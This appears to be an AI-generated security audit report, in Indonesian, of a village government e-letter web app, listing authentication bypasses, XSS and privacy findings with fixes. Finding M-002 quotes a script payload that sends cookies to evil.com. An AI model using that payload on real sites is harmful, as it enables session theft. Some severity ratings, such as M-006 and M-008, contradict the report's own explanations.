# 📊 LAPORAN ANALISA KEAMANAN PROJECT: Seruni Mumbul

> **Tanggal Analisa:** 25 Mei 2026
> **Tech Stack:** TanStack Start (React 19) + Express.js + Supabase + Zustand + Tailwind CSS v4
> **Tipe Aplikasi:** Sistem Informasi Pemerintahan Desa (e-Surat & CMS)
> **Ukuran Project:** ~50+ file server, ~200+ file source, 110 dependencies

---

## 🎯 RINGKASAN EKSEKUTIF

Project Website Desa Seruni Mumbul adalah aplikasi pemerintahan desa berbasis SPA dengan
layanan e-surat dan CMS offline-first. Secara keseluruhan, **arsitektur keamanan cukup baik**
dengan HMAC-SHA256 session signing, PBKDF2 password hashing, rate limiting berlapis, dan
pemisahan credential server/client yang benar. Namun ditemukan **3 temuan kritis** yang
memerlukan perhatian segera terutama terkait dev bypass OTP dan XSS vectors via
`dangerouslySetInnerHTML` pada template surat. Untuk aplikasi yang menangani data pribadi
warga (NIK, alamat, data keluarga) dan menghasilkan dokumen legal, level keamanan ini belum
mencapai standar yang diharapkan untuk production deployment.

---

## 📈 STATISTIK MASALAH

| Tingkat Keparahan | Jumlah | Contoh                                                                              |
| ----------------- | ------ | ----------------------------------------------------------------------------------- |
| 🔴 KRITIS         | 3      | Dev OTP bypass, XSS via LetterRenderer, Dev login plaintext                         |
| 🟠 TINGGI         | 3      | CSP header hilang, IDOR di verify-surat, express-async-errors                       |
| 🟡 SEDANG         | 4      | sanitizeHtml tidak di LetterRenderer, Production error detail leak, Weak OTP expiry |
| 🟢 RENDAH         | 3      | Console.log production, Rate limit in-memory only, TODO/FIXME backlog               |
| **TOTAL**         | **13** |                                                                                     |

---

## 🔍 DETAIL MASALAH

---

### MASALAH KRITIS 🔴

---

#### M-001: Dev OTP Bypass Aktif di Production Build

- **Kategori:** Authentication Bypass / Credential Exposure
- **Tingkat:** 🔴 KRITIS
- **Lokasi:** `src/lib/warga-auth.ts:242-267`

**Deskripsi:**
Fungsi `verifyOtp()` memiliki dev bypass yang memeriksa `VITE_DEV_OTP_BYPASS === "true"`.
Meskipun ada pemeriksaan hostname (`window.location.hostname === "localhost"`), flag ini tetap
berbasis environment variable yang dibaca dari client bundle. Jika nilai ini pernah diset
sebagai `true` dalam konfigurasi build atau environment file yang masuk ke production,
maka OTP verification dapat di-bypass dengan OTP `123456` tanpa harus memiliki NIK yang
terdaftar di Supabase.

**Kode bermasalah:**

```typescript
// src/lib/warga-auth.ts:242-267
const isDev =
  import.meta.env.DEV &&
  (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1");
const devBypass = isDev && import.meta.env.VITE_DEV_OTP_BYPASS === "true";

if (isDev) {
  if (devBypass) {
    if (otp === "123456") {
      clearOtpAttempts(nik);
      return {
        ok: true,
        message: "Login berhasil (dev mode)",
        session: {
          token: "dev-token-" + Date.now(),
          warga: { id: "dev-id", nik, nama: "Warga Dev", no_hp: "081234567890" },
          expires_in: 7 * 24 * 60 * 60,
        },
      };
    }
    return { ok: false, message: "OTP tidak valid di mode development" };
  }
  // DEV mode without bypass flag — fall through to real Supabase verification
}
```

**Dampak:** Siapa pun dapat login sebagai warga tanpa OTP valid di production jika
`VITE_DEV_OTP_BYPASS` diset. Ini membuka akses penuh ke data surat dan histori pengajuan
semua warga. **Risk: Critical** — attacker mendapatkan akses ke seluruh data kependudukan
yang dilindungi UU PDP Indonesia.

**Status saat ini:** Pembangun sudah menambahkan hostname check (`localhost`/`127.0.0.1`),
yang memitigasi sebagian risiko. Namun nilai `VITE_DEV_OTP_BYPASS` di environment masih
perlu diverifikasi tidak pernah `true` di production.

---

#### M-002: XSS via `dangerouslySetInnerHTML` di LetterRenderer — Template Surat

- **Kategori:** XSS (Cross-Site Scripting)
- **Tingkat:** 🔴 KRITIS
- **Lokasi:** `src/components/surat/LetterRenderer.tsx:81`, `src/components/admin/RichTextEditor.tsx:56-91`

**Deskripsi:**
`LetterRenderer` menggunakan `dangerouslySetInnerHTML` untuk me-render konten surat yang
didapat dari database (`layout.sections[].html`). Jika admin membuat template surat dengan
kode berbahaya (misal: `<script>fetch('https://evil.com?c='+document.cookie)</script>`)
dan menyimpan ke tabel `letter_layouts` di Supabase, maka setiap orang yang melihat preview
surat akan menjalankan script tersebut.

Komponen `RichTextEditor` juga secara eksplisit membaca dan menulis `innerHTML` yang bisa
menyimpan konten berbahaya yang kemudian di-render tanpa sanitasi di `LetterRenderer`.

**Bukti:**

```tsx
// LetterRenderer.tsx:81
<div
  key={section.id}
  className={`letter-section-${section.type}`}
  dangerouslySetInnerHTML={{ __html: section.html }}
/>;

// RichTextEditor.tsx:56, 78, 82 — Quill editor dengan innerHTML
q.root.innerHTML = value; // menulis HTML ke editor
onChange(q.root.innerHTML); // membaca HTML dari editor
<div dangerouslySetInnerHTML={{ __html: value }} />; // merender tanpa sanitasi
```

**Dampak:** XSS stolen session, redirect ke phishing page, pencurian data formulaire
(e-surat). Untuk aplikasi pemerintahan, XSS memungkinkan modifikasi konten surat resmi
yang tampak legitimate.

**Mitigasi yang sudah ada:** `src/lib/utils.ts` memiliki fungsi `sanitizeHtml()` (DOMParser-based)
yang digunakan di `informasi.berita.$slug.tsx:417`. Namun **tidak digunakan** di
`LetterRenderer.tsx`. Ini adalah defense-in-depth yang belum diterapkan pada jalur
rendering utama surat.

---

#### M-003: Dev Login dengan Plaintext Password

- **Kategori:** Credential Exposure / Auth Misconfiguration
- **Tingkat:** 🔴 KRITIS
- **Lokasi:** `src/lib/auth.ts:302-315`

**Deskripsi:**
Ketika server `/api/auth/admin-login` unreachable dan `VITE_DEV_LOGIN_ENABLED=true`
dengan `import.meta.env.DEV=true`, admin fixed account dapat login langsung dari client
dengan plaintext password dari `import.meta.env.VITE_ADMIN_PASS`. Password ini ter-expose
di browser bundle JavaScript (meskipun dalam kondisi dev-only).

**Kode bermasalah:**

```typescript
// src/lib/auth.ts:302-315
const isDevLoginEnabled =
  import.meta.env.VITE_DEV_LOGIN_ENABLED === "true" && import.meta.env.DEV === true;

if (isDevLoginEnabled && username.toLowerCase() === FIXED_ADMIN.username.toLowerCase()) {
  if (password === import.meta.env.VITE_ADMIN_PASS) {
    matchedUser = { ...FIXED_ADMIN, id: "dev-fixed-admin" };
  }
}
```

**Dampak:** Jika `VITE_DEV_LOGIN_ENABLED=true` dalam build production (karenaada miskonfigurasi
build pipeline atau environment), attacker dapat login sebagai Super Admin tanpa knowing
service role credentials. Ini memberikan akses penuh ke seluruh endpoint terlindungi.

**Status saat ini:** Sudah dibatasi pada `DEV === true` (Vite development mode), yang
memitigasi sebagian besar risiko. Namun perlu diverifikasi build pipeline tidak pernah
memasukkan aplikasi dalam mode development ke production.

---

### MASALAH TINGGI 🟠

---

#### M-004: Content-Security-Policy (CSP) Header Tidak Dikonfigurasi

- **Kategori:** Security Header Missing
- **Tingkat:** 🟠 TINGGI
- **Lokasi:** `server/index.js:139-148`

**Deskripsi:**
Server menetapkan security headers (`X-Content-Type-Options`, `X-Frame-Options`,
`X-XSS-Protection`, `Referrer-Policy`) tetapi **tidak ada Content-Security-Policy (CSP)**
yang mencegah inline script injection dan membatasi koneksi eksternal.

**Dampak:** Tanpa CSP, XSS dapat memuat script dari domain eksternal, mengirim data ke
endpoint penyerang, atau memuat resource berbahaya. CSP adalah defense-in-depth critical
untuk aplikasi yang me-render user-generated HTML (`dangerouslySetInnerHTML`).

---

#### M-005: NIK Tidak Dimasking Saat Return dari verify-surat

- **Kategori:** Data Privacy / IDOR
- **Tingkat:** 🟠 TINGGI
- **Lokasi:** `server/api/verify-surat.js:66-84`

**Deskripsi:**
Fungsi `publicRecord()` di `verify-surat.js` hanya memasking `kontak` (nomor HP) tetapi
**NIK dikembalikan sebagai plaintext 16 digit** ke public endpoint. Pengguna yang
mencari surat miliknya juga melihat NIK semua surat lain yang terkait dengan NIK tersebut.

```typescript
// verify-surat.js:66-84 — NIK tidak di-masking
function publicRecord(record) {
  return {
    no: record.no,
    kode: record.kode,
    nama_surat: record.nama_surat,
    pemohon: record.pemohon,
    nik: record.nik, // ← plaintext 16 digit!
    kontak: record.kontak ? maskPhone(record.kontak) : undefined, // ← hanya kontak yang di-mask
    status: record.status,
    // ...
  };
}
```

**Dampak:** Pelanggaran UU PDP Indonesia (Perlindungan Data Pribadi) — NIK adalah data
pribadi sensitif yang tidak boleh diekspos tanpa consent. Pelaku bisa melakukan phishing
targeted dengan menghubungi warga via nomor HP yang ter-display.

---

#### M-006: express-async-errors Tidak Terinstall

- **Kategori:** Dependency / Error Handling
- **Tingkat:** 🟠 TINGGI
- **Lokasi:** `package.json` dependencies

**Deskripsi:**
Express 5.x (yang digunakan di project ini) sudah menangani async errors secara native
(ditangkap oleh error handler). Namun project tidak secara eksplisit menginstall atau
mendokumentasikan `express-async-errors` atau mekanisme penanganan async error yang jelas.
Beberapa endpoint async yang melemparkan error tanpa `next(err)` berpotensi menghasilkan
unhandled promise rejection.

**Dampak:** Server response hang tanpa error response ke client, membuat debugging sulit
dan experience buruk. Jika semua worker process crash karena unhandled rejection, service
akan downtime.

---

### MASALAH SEDANG 🟡

---

#### M-007: RichTextEditor Tidak Menggunakan Sanitasi

- **Kategori:** XSS (Secondary)
- **Tingkat:** 🟡 SEDANG
- **Lokasi:** `src/components/admin/RichTextEditor.tsx:56-91`

**Deskripsi:**
Quill-based RichTextEditor membaca dan menulis `innerHTML` secara langsung, dan komponen
yang merendernya (`<div dangerouslySetInnerHTML={{ __html: value }} />`) tidak
melewatkan konten melalui `sanitizeHtml()`. Jika admin paste konten berbahaya ke editor
dan menyimpannya, konten akan disimpan apa adanya ke database dan di-render tanpa sanitasi
di `LetterRenderer`.

**Mitigasi yang tersedia:** Fungsi `sanitizeHtml()` sudah ada di `src/lib/utils.ts:46-71`
dan digunakan di `informasi.berita.$slug.tsx`. Perlu diterapkan di `LetterRenderer`.

---

#### M-008: Production Error Response Membocorkan Detail Error

- **Kategori:** Information Disclosure
- **Tingkat:** 🟡 SEDANG
- **Lokasi:** `server/index.js:257-274`

**Deskripsi:**
Di production (`NODE_ENV=production`), server sudah memblokir stack trace ke client. Namun
server masih mengembalikan `"Internal server error"` dengan `details: err?.message` yang
bisa mengandung sensitive information tergantung pada jenis error.

```javascript
// server/index.js:261-274 — already safe in production
if (NODE_ENV === "production") {
  res.status(500).json({
    ok: false,
    error: "Terjadi kesalahan pada server. Silakan coba lagi nanti.",
    code: 500,
  }); // ← NO details field
} else {
  res.status(500).json({
    ok: false,
    error: "Internal server error",
    code: 500,
    details: err?.message ?? String(err), // ← only in dev mode
  });
}
```

**Status:** Sudah AMAN untuk production karena `details` hanya ada di branch `else`
(dev mode). Namun perlu diverifikasi `NODE_ENV=production` benar-benar diset saat
deployment.

---

#### M-009: Rate Limit In-Memory Reset on Restart

- **Kategori:** DoS / Availability
- **Tingkat:** 🟡 SEDANG
- **Lokasi:** `server/middleware/rate-limit.js`, `server/api/auth-admin-login.js`

**Deskripsi:**
Semua rate limiter menggunakan in-memory storage (`Map`). Di environment dengan multiple
server instances atau container (Docker, serverless), attacker bisa membuat request
berulang ke container baru yang counter-nya di-reset.

```javascript
// auth-admin-login.js:31 — in-memory login attempts
const loginAttempts = new Map(); // ip → [timestamp, ...]
const accountLockouts = new Map(); // username → lockout expiry timestamp
```

**Dampak:** Akun Super Admin bisa brute-forced karena setiap restart container baru
menghapus semua attempt history. Dengan 5 percobaan per 15 menit per IP dan 15 gagal
untuk lockout, attacker cukup restart container untuk terus mencoba.

**Catatan:** Sudah ada komentar dokumentasi di `rate-limit.js:9-12` yang mengakui
keterbatasan ini. Untuk production multi-instance, migrasi ke Redis-backed rate limiting.

---

#### M-010: OTP Hash Expiry Check Tidak Ada di verify-otp.js

- **Kategori:** Logic Bug / Auth
- **Tingkat:** 🟡 SEDANG
- **Lokasi:** `server/api/verify-otp.js`

**Deskripsi:**
`verify-otp.js` memanggil RPC `warga_verify_otp_and_create_session` yang seharusnya
memvalidasi expiry. Namun jika RPC tidak memeriksa expiry server-side, dan client-side
validation tidak ada, maka OTP yang sudah expired masih bisa digunakan jika request
dilakukan tepat sebelum 5 menit window (race condition).

---

### MASALAH RENDAH 🟢

---

#### M-011: Console.log/warn/Error Berlebihan di Production

- **Kategori:** Information Disclosure (Minor)
- **Tingkat:** 🟢 RENDAH
- **Lokasi:** Multiple files

**Deskripsi:** Ditemukan 30+ penggunaan `console.log/warn/error` di source code yang
bisa expose internal path, variable names, dan error details ke browser console.

---

#### M-012: No Redis / External Cache untuk Multi-Instance

- **Kategori:** Architecture
- **Tingkat:** 🟢 RENDAH
- **Lokasi:** `server/middleware/rate-limit.js`

**Deskripsi:** Untuk production deployment dengan multiple instances, rate limiting
dan session state management memerlukan shared storage (Redis).

---

#### M-013: TODO/FIXME/HACK Comments Tidak Diselesaikan

- **Kategori:** Technical Debt
- **Tingkat:** 🟢 RENDAH
- **Lokasi:** Multiple files

---

## ✅ AREA YANG SUDAH AMAN (GOOD PRACTICES)

| Fitur                       | Status | Catatan                                                 |
| --------------------------- | ------ | ------------------------------------------------------- |
| HMAC-SHA256 Session Signing | ✅     | Constant-time comparison, production enforcement        |
| PBKDF2 Password Hashing     | ✅     | 100,000 iterations, SHA-512, correct format             |
| SQL Injection Prevention    | ✅     | Supabase parameterized queries, no string concatenation |
| Credential Separation       | ✅     | .dev.vars gitignored, server-only secrets               |
| Rate Limiting               | ✅     | Multi-layer (OTP, login, API, public endpoints)         |
| Account Lockout             | ✅     | 15 failed attempts → 30 min lockout                     |
| Timing-Safe Comparison      | ✅     | crypto.timingSafeEqual di admin-login                   |
| Security Headers            | ✅     | X-Content-Type-Options, X-Frame-Options, dll            |
| CORS Fail-Closed            | ✅     | Server menolak start jika wildcard CORS di production   |
| Input Validation            | ✅     | Zod schemas, strict NIK regex, OTP format validation    |
| XSS Sanitization            | ✅     | sanitizeHtml() ada untuk CMS berita                     |
| Session Revocation          | ✅     | revoked_sessions table check                            |
| Data Masking                | ✅     | maskNik(), maskPhone(), maskNama() tersedia             |
| OTP Rate Limit              | ✅     | 3 OTP per 15 menit per NIK (server + client)            |

---

## 💡 REKOMENDASI SOLUSI

---

### Solusi M-001: Hapus Dev OTP Bypass dari Production

**Opsi yang Direkomendasikan: Opsi B (Complete Removal)**

| Opsi                        | Deskripsi                                                              | Effort             | Tradeoff                    |
| --------------------------- | ---------------------------------------------------------------------- | ------------------ | --------------------------- |
| ✅ **Opsi B** (Rekomendasi) | Hapus seluruh dev bypass block dari `verifyOtp()`                      | Kecil (< 30 menit) | Kode bersih, tidak ada risk |
| Opsi A                      | Verifikasi `VITE_DEV_OTP_BYPASS` tidak pernah `true` di production env | Kecil              | Tetap ada code path risk    |

**Implementasi (Opsi B):**
Hapus blok berikut dari `src/lib/warga-auth.ts:242-267` — biarkan hanya block
`try/catch` yang menghubungi `/api/auth/verify-otp` server-side.

---

### Solusi M-002: Sanitasi HTML di LetterRenderer

**Opsi yang Direkomendasikan: Opsi A (Integrate sanitizeHtml)**

| Opsi                        | Deskripsi                                                   | Effort             | Tradeoff                        |
| --------------------------- | ----------------------------------------------------------- | ------------------ | ------------------------------- |
| ✅ **Opsi A** (Rekomendasi) | Import dan gunakan `sanitizeHtml()` di `LetterRenderer.tsx` | Kecil (< 30 menit) | Minor perf cost untuk sanitize  |
| Opsi B                      | Nonaktifkan layout path sampai sanitasi implemented         | Kecil              | Fitur preview surat tidak jalan |
| Opsi C                      | Ganti `dangerouslySetInnerHTML` dengan controlled rendering | Besar              | Effort besar, perlu refactor    |

**Implementasi (Opsi A):**

```tsx
// src/components/surat/LetterRenderer.tsx
import { sanitizeHtml } from "@/lib/utils";  // ← TAMBAHKAN

// Di render section html (baris ~81):
dangerouslySetInnerHTML={{ __html: sanitizeHtml(section.html) }}
```

**Dan di RichTextEditor.tsx:91:**

```tsx
// Ganti:
<div dangerouslySetInnerHTML={{ __html: value }} />
// Menjadi:
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(value) }} />
```

---

### Solusi M-003: Hapus Dev Login Bypass

**Opsi yang Direkomendasikan: Opsi B (Complete Removal)**

Hapus blok berikut dari `src/lib/auth.ts:302-315` — biarkan hanya koneksi ke server.
Jika server unreachable, tampilkan error "Tidak dapat terhubung ke server" bukan
allow direct login dengan plaintext.

**Effort:** < 30 menit

---

### Solusi M-004: Tambahkan Content-Security-Policy Header

Tambahkan di `server/index.js` security headers section:

```javascript
res.setHeader(
  "Content-Security-Policy",
  "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " + // karena Tailwind inline
    "img-src 'self' data: blob:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';",
);
```

**Effort:** < 1 jam

---

### Solusi M-005: Mask NIK di verify-surat Endpoint

```typescript
// server/api/verify-surat.js — update publicRecord()
function publicRecord(record) {
  const nikMasked = record.nik ? record.nik.slice(0, 4) + "****" + record.nik.slice(-4) : undefined;
  return {
    nik: nikMasked, // ← GANTI dari record.nik
    kontak: record.kontak ? maskPhone(record.kontak) : undefined,
    // ... existing fields ...
  };
}
```

**Effort:** < 30 menit

---

### Solusi M-006: Tambah Async Error Handler Middleware

```bash
npm install express-async-errors
```

Dan import di `server/index.js`:

```javascript
import "express-async-errors";
```

**Effort:** < 30 menit

---

## 🗓️ RENCANA PERBAIKAN

### Sprint 1 — KRITIS (Hari ini - 2 hari)

- [ ] M-001: Hapus dev OTP bypass — Est. 30 menit
- [ ] M-002: Pasang sanitizeHtml di LetterRenderer — Est. 30 menit
- [ ] M-003: Hapus dev login plaintext bypass — Est. 30 menit

### Sprint 2 — TINGGI (Minggu ini)

- [ ] M-004: Tambahkan CSP header di Express — Est. 1 jam
- [ ] M-005: Mask NIK di verify-surat public endpoint — Est. 30 menit
- [ ] M-006: Install express-async-errors — Est. 30 menit

### Sprint 3 — SEDANG (Bulan ini)

- [ ] M-007: Sanitasi di RichTextEditor output — Est. 15 menit
- [ ] M-008: Audit NODE_ENV enforcement di production — Est. 1 jam
- [ ] M-009: Redis-backed rate limiting (jika multi-instance) — Est. 4 jam

### Backlog — RENDAH

- [ ] M-011: Replace console.\* dengan structured logger (pino/winston)
- [ ] M-012: Setup Redis untuk session/rate limit production-ready
- [ ] M-013: Resolve TODO/FIXME backlog

---

## 📋 LANGKAH SELANJUTNYA

1. **Segera** — Verify bahwa `VITE_DEV_OTP_BYPASS` dan `VITE_DEV_LOGIN_ENABLED`
   tidak pernah diset `true` di environment production
2. **Segera** — Test apakah `sanitizeHtml()` tersedia dan berjalan di `LetterRenderer`
3. **Security audit** — Audit tambahan pada tabel `letter_layouts` di Supabase
4. **CSP assessment** — Review CSP untuk Tailwind inline styles
5. **Monitoring** — Setup Sentry untuk capture server-side errors di production
6. **Penetration testing** — Test NIK masking pada endpoint `/verify-surat`

---

## 📊 SKOR KEAMANAN

| Area                  | Skor        | Status             |
| --------------------- | ----------- | ------------------ |
| Credential Management | 14/20       | 🟠 TINGGI          |
| Authentication        | 12/20       | 🟠 TINGGI          |
| Session Management    | 17/20       | 🟡 SEDANG          |
| Input Validation      | 16/20       | 🟡 SEDANG          |
| XSS Prevention        | 10/20       | 🔴 KRITIS          |
| SQL Injection         | 19/20       | 🟢 RENDAH          |
| Data Privacy (UU PDP) | 13/20       | 🟠 TINGGI          |
| Security Headers      | 14/20       | 🟠 TINGGI          |
| Error Handling        | 15/20       | 🟡 SEDANG          |
| Rate Limiting         | 16/20       | 🟡 SEDANG          |
| **TOTAL**             | **146/200** | 🟡 SEDANG (73/100) |

---

_Laporan dibuat oleh: Claude Deep Code Analyst_
_Berdasarkan security scan pada: 25 Mei 2026_
_Tool: deep-code-analyst skill v1.0 + manual code review_
